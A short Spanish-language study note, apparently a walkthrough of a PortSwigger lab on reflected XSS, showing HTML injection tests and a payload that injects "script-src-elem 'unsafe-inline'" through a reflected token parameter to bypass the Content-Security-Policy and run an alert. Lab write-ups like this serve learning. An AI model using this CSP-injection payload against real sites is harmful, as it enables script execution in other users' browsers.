___
- tags: #xss #portswigger
___
## Paso a paso

Vemos que me permite inyectar html
```html
<marquee> Hola </marquee>
```

Pero no <script>alert(0)</script>
```html
<script>alert(0)</script>
```

### Revisamos como se maneja el csp

Identificamos que se espera un **?token=** por lo que vemos si es manipulable

![[Pasted image 20250829191257.png]]

y efectivamente lo es

```txt
?search=wua&token=prueba
```

![[Pasted image 20250829191459.png]]

### Deshabilitamos el sanitizado en linea y emitimos la alerta
```txt
<script>alert(0)</script>&token=; script-src-elem 'unsafe-inline'
```